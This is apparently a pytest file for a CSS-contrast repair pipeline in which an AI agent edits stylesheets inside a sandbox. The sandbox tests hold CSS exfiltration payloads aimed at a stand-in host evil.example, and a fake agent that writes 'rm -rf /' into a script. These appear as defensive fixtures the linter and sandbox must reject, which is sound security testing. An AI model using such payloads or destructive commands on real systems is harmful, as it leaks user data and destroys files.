"""glasslab add: deterministic pipeline + verifier-gated agent loop (agent and lab injected → no browser, no LLM)."""
from tools.glasslab import pipeline


def row(key, ok, contrast=1.0, surface=1.0, text=1.0, state=None, failing=(), foreign=()):
    r = {"key": key, "ok": ok, "contrast": [contrast, contrast], "surface": surface, "text": text, "mode": key.split(".")[1],
         "alpha": 0.45, "failing": list(failing), "surface_foreign": list(foreign), "text_foreign": [], "screen": key.split("~")[0].split(".")[0]}
    return {**r, "state": state} if state else r


def test_progress_orders_runs():
    worse = [row("a.dark.45", False, contrast=0.5), row("a.light.45", True)]
    better = [row("a.dark.45", False, contrast=0.8), row("a.light.45", True)]
    best = [row("a.dark.45", True), row("a.light.45", True)]
    assert pipeline.progress(worse) < pipeline.progress(better) < pipeline.progress(best)


def test_progress_counts_only_default_alpha():
    extreme = dict(row("a.dark.10", False), alpha=0.1)
    assert pipeline.progress([row("a.dark.45", True), extreme]) == pipeline.progress([row("a.dark.45", True)])


def test_report_names_what_to_fix():
    rows = [row("a.dark.45", False, contrast=0.6, failing=[{"sel": "div.x", "lc": [30, 20], "target": 60, "fg": "rgb(1, 1, 1)", "t": "Hi", "chars": 9}],
                foreign=[["rgb(255, 255, 255) div.card", 40]]),
            row("a~file-menu.dark.45", False, state="File menu", surface=0.2)]
    md = pipeline.report_md(rows)
    assert "div.x" in md and "rgb(255, 255, 255) div.card" in md and "File menu" in md
    assert "a.dark.45" in md


def run_loop(scores, agent_edits):
    """fake lab returns progress scores in order; fake agent appends a line per round"""
    css = {"text": "base\n"}
    runs = iter(scores)
    calls = []

    def lab():
        ok, c = next(runs)
        return [row("a.dark.45", ok, contrast=c)]

    def agent(prompt):
        calls.append(prompt)
        css["text"] += agent_edits.pop(0)

    final, log = pipeline.improve(lab, agent, read=lambda: css["text"], write=lambda t: css.update(text=t), rounds=3)
    return css["text"], final, log, calls


def test_loop_keeps_improvements_and_reverts_regressions():
    # start 0.5 → round1 0.7 (keep) → round2 0.6 (revert) → round3 pass (keep, stop)
    text, final, log, calls = run_loop([(False, 0.5), (False, 0.7), (False, 0.6), (True, 1.0)], ["r1\n", "r2\n", "r3\n"])
    assert text == "base\nr1\nr3\n"
    assert [l["kept"] for l in log] == [True, False, True]
    assert all(r["ok"] for r in final)


def test_loop_stops_when_green():
    text, final, log, calls = run_loop([(True, 1.0)], [])
    assert calls == [] and log == []


def test_prompt_is_deterministic_and_scoped():
    p1 = pipeline.prompt("site.css", "css here", "report here")
    assert p1 == pipeline.prompt("site.css", "css here", "report here")
    assert "site.css" in p1 and "var(--g-" in p1 and "report here" in p1 and "only" in p1.lower()


# ── agent sandbox: the agent edits a copy, only lint-clean CSS comes back ──
def test_report_for_agents_has_no_page_text():
    rows = [row("a.dark.45", False, contrast=0.6, failing=[{"sel": "div.x", "lc": [30, 20], "target": 60, "fg": "rgb(1, 1, 1)", "t": "Secret subject line", "chars": 9}])]
    assert "Secret subject" in pipeline.report_md(rows)              # local report: the human sees it
    assert "Secret subject" not in pipeline.report_md(rows, page_text=False)


def test_css_lint_allows_only_glass_mappings():
    ok = '@import url("../shared/glass.css");\n.x { color: var(--g-fg) !important; }'
    assert pipeline.lint_css(ok) == []
    for bad in ['.x { background: url(https://evil.example/?q) }', '@import url("https://evil.example/x.css");',
                '.x { background-image: image-set("x.png" 1x) }', '.x::after { content: attr(value) }']:
        assert pipeline.lint_css(bad), bad


def test_sandbox_round_returns_only_the_css(tmp_path):
    root = tmp_path / "repo"
    (root / "styles/websites").mkdir(parents=True)
    (root / "styles/shared").mkdir(parents=True)
    (root / "docs").mkdir()
    (root / "styles/shared/glass.css").write_text(":root{}")
    (root / "docs/GLASS.md").write_text("rules")
    css = root / "styles/websites/site.css"
    css.write_text("old")

    def agent(prompt, cwd):
        assert not (cwd / ".git").exists() and (cwd / "docs/GLASS.md").exists()
        (cwd / "styles/websites/site.css").write_text(".x { color: var(--g-fg) }")
        (cwd / "evil.sh").write_text("rm -rf /")
    pipeline.sandboxed(agent, root, css)("prompt")
    assert css.read_text() == ".x { color: var(--g-fg) }" and not (root / "evil.sh").exists()


def test_sandbox_rejects_unsafe_css(tmp_path):
    root = tmp_path / "repo"
    (root / "styles/websites").mkdir(parents=True)
    css = root / "styles/websites/site.css"
    css.write_text("old")
    pipeline.sandboxed(lambda p, cwd: (cwd / "styles/websites/site.css").write_text(".x{background:url(//evil)}"), root, css)("p")
    assert css.read_text() == "old"


def test_progress_compares_only_rows_both_runs_have():
    """the explorer may find a different number of states run to run: noise must not decide keep/revert"""
    before = [row("a.dark.45", False, contrast=0.5)]
    after = [row("a.dark.45", False, contrast=0.6), row("a~extra.dark.45", True)]
    assert pipeline.better(after, before)
    assert not pipeline.better([row("a.dark.45", False, contrast=0.4), row("a~extra.dark.45", True)], before)
